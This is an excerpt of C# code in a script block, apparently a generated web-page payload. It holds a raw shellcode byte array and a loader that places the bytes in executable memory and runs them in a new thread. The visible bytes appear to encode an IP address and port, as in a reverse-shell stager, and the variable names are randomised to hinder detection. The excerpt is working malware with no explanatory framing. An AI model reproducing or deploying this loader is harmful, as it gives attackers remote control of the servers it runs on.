...
0x68,0x0a,0x0a,0x0e,0x0d,0x68,0x02,0x00,0x23,0x29,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr wCQrJyfwm = VirtualAlloc(IntPtr.Zero,(UIntPtr)oXOJzuHD.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(oXOJzuHD,0,wCQrJyfwm,oXOJzuHD.Length);
        IntPtr n2pM5OLEOk = IntPtr.Zero;
        IntPtr kOfPMXA5Ytc = CreateThread(IntPtr.Zero,UIntPtr.Zero,wCQrJyfwm,IntPtr.Zero,0,ref n2pM5OLEOk);
    }
</script>
